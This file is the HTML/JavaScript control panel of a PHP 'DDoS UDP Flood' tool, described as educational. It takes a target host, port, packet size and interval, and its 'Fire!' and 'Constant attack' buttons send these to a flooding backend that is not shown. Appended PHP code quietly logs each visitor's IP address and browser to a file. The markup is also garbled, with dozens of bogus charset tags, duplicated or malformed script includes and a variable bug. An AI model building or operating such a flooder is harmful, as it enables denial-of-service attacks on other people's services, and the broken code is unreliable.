<!--
  ui.html
   
	Script to perform a DDoS UDP Flood by PHP
 
	This tool is written on educational purpose, please use it on your own good faith.
  
  GNU General Public License version 2.0 (GPLv2)
	@version	0.1

-->

<!DOCTYPE html>

<html>

<head>

	<title>DDoS UDP Flood</title>

    <meta charset="UTF-8" />
    <meta charset="UTF-16" />
    <meta charset="UTF-16BE" />
    <meta charset="UTF-16LE" />
    <meta charset="UTF-32" />
    <meta charset="UTF-32BE" />
    <meta charset="UTF-32LE" />
    <meta charset="Arabic (ISO-8859-6)" />
    <meta charset="Arabic (windows-1256)" />
    <meta charset="Baltic (ISO-8859-4)" />
    <meta charset="Baltic (ISO-8859-13)" />
    <meta charset="Baltic (windows-1257)" />
    <meta charset="Celtic (ISO-8859-14)" />
    <meta charset="Cyrillic (IBM866)" />
    <meta charset="Cyrillic (KOI8-U)" />
    <meta charset="Cyrillic (windows-1251)" />
    <meta charset="Central European (windows-1250)" />
    <meta charset="Eastern European (ISO-8859-2)" />
    <meta charset="Greek (ISO-8859-2)" />
    <meta charset="Greek (windows-1253)" />
    <meta charset="Hebrew (ISO-8859-8)" />
    <meta charset="Hebrew (windows-1258)" />
    <meta charset="Japonese (EUC-JP)" />
    <meta charset="Japonese (ISO-2022-JP)" />
    <meta charset="Japonese (Shift-JIS)" _>
    <meta charset="Korean (EUC-KR)" />
    <meta charset="Korean (ISO-2022-KR)" />
    <meta charset="Simplified Chinese (GV18030)" />
    <meta charset="Simplified Chinese (GBK)" />
    <meta charset="Simplified Chinese (ISO-2022-CN)" />
    <meta charset="Thai (TIS-620)" />
    <meta charset="Traditional Chinese (Big5)" />
    <meta charset="Traditional Chinese (Big5-HKSCS)" />
    <meta charset="Turkish (ISO-8859-3)" />
    <meta charset="Turkish (ISO-8859-9)" />
    <meta charset="Turkish (windows-1254)" />
    <meta charset="Vietnamese (wimdows-1258)">
    <meta charset="Western European (ISO-8859-1)" />
    <meta charset="Western European (ISO-8859-15)" />
    <meta charset="Western European (windows-1252)" />  
    <meta name="viewport" content="width=device-width, initial-scale=1" />
	
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://releases.jquery.com/git/mobile/git/jquery.mobile-git.css" />
    <link rel="stylesheet" href="https://code.jquery.com/qunit/qunit-2.24.3.css" />
   
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6/dist/jquery.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/src/core.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.6.4/dist/jquery.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.6/dist/jquery.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js"> </script>
    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.6.4/src/core.min.js"> </script> 
    <script src="https://releases.jquery.com/git/mobile/git/jquery.mobile-git.j"s> </script>
    <script src="https://code.jquery.com/qunit/qunit-2.24.3.js"> </script>

	<script>

		// microAjax - https://github.com/TheZ3ro/microajax/
		function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
	
    </script>

</head>

<body>

	<div id="ddos">
		<button id="loadLag" onClick="javascript:lagConfig();">Lag config</button>
		<button id="loadTraffic" onClick="javascript:trafficConfig();">Traffic config</button>
		<br />
		<label>Host:</label><input type="text" id="host"><br/>
		<label>Port:</label><input type="number" id="port" max=65535 min=1 step=1 value=80><br/>
		<label>Packet:</label><input type="number" id="packet" min=1 step=1><br/>
		<label>Time:</label><input type="number" id="time" min=1 step=1 value=5><br/>
		<label>Bytes:</label><input type="number" id="bytes" max=65000 min=1 step=1 value=65000><br/>
		<label>Interval:</label><input type="number" id="interval" max=10000 min=1 step=1 value=10><br/>
		<label>Pass:</label><input type="text" id="pass"><br/>
		<button id="send" onClick="javascript:fire();">Fire!</button>
		<br/><br/>
		<label>Constant attack with smart delays</label>
		<button id="sendWithInterval" onClick="javascript:constantAttack(true);">Start</button>
		<button id="stopInterval" disabled="true" onClick="javascript:constantAttack(false);">Stop</button>
		<br/><br/>
		<textarea id="log" rows="10" cols="50"></textarea>
	</div>

	<script>

		var _log=document.getElementById("log");
		var intervalHandler = null;
		function fire(){
			var host=document.getElementById("host").value;
			var port=document.getElementById("port").value;
			var packet=document.getElementById("packet").value;
			var time=document.getElementById("time").value;
			var pass=document.getElementById("pass").value;
			var bytes=document.getElementById("bytes").value;
			var interval=document.getElementById("interval").value;
			
			
			if(host!="" && pass!=""){
				inputLock(true);
				var url='./backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
				console.log(url);
				microAjax(url, function(result) { 
				_log.value=result;
				if(_log.value.includes("Wrong password")){
					constantAttack(false);
				}
				if(intervalHandler == null){
					inputLock(false);
				}
				});
			}
			else{
				_log.value = "Not all required parameters are filled correctly!"
			}
		}
		
		function lagConfig(){
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "10";
			bytes=document.getElementById("bytes").value = "1";
			interval=document.getElementById("interval").value = "0";
		}
		
		function trafficConfig(){
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "5";
			bytes=document.getElementById("bytes").value = "65000";
			interval=document.getElementById("interval").value = "10";
		}
		
		function constantAttack(status){
			var host=document.getElementById("host").value;
			var host=document.getElementById("pass").value;
			var intervalTime=(document.getElementById("time").value * 1000) + 1000;
			if(host!="" && pass!=""){
				if(status == true){
					fire();
					inputLock(true);
					intervalHandler = setInterval(fire,intervalTime);
				}
				else if(status == false){
					clearInterval(intervalHandler);
					inputLock(false);
					intervalHandler = null;
				}
			}
			else{
				_log.value = "Not all required parameters are filled correctly!"
			}
		}
		
		function inputLock(status){
			var inputs = document.getElementsByTagName("input");
			var buttons = document.getElementsByTagName("button");
			if(status == true){
				for(i = 0;i < inputs.length;i++)
				{
					inputs[i].disabled = true;
				}
				for(i = 0;i < buttons.length;i++)
				{
					buttons[i].disabled = true;
				}
				document.getElementById("stopInterval").disabled = false;
			}
			else{
				for(i = 0;i < inputs.length;i++)
				{
					inputs[i].disabled = false;
				}
				for(i = 0;i < buttons.length;i++)
				{
					buttons[i].disabled = false;
				}
				document.getElementById("stopInterval").disabled = true;
			}
		}

	</script>

</body>

</html>

<?php

$ip = getUserIP();
$browser = $_SERVER['HTTP_USER_AGENT'];
$dateTime = date('Y/m/d G:i:s');
$file = "visitors.html";
$file = fopen($file, "a");
$data = "<pre><b>User IP</b>: $ip <b> Browser</b>: $browser <br>on Time : $dateTime <br></pre>";
fwrite($file, $data);
fclose($file);


function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

?>